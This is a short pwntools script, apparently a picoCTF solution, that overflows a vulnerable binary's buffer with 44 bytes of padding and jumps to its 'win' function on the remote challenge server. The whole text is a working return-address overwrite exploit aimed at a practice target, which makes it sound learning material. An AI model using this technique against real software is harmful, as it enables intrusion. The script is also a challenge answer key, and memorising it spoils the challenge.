from pwn import *

# prg = process("./vuln")
prg = remote("saturn.picoctf.net", 49283)
elf = ELF("./vuln")

payload = b'A' * 44 + p32(elf.symbols["win"]) + b'\n'

prg.send(payload)
prg.interactive()
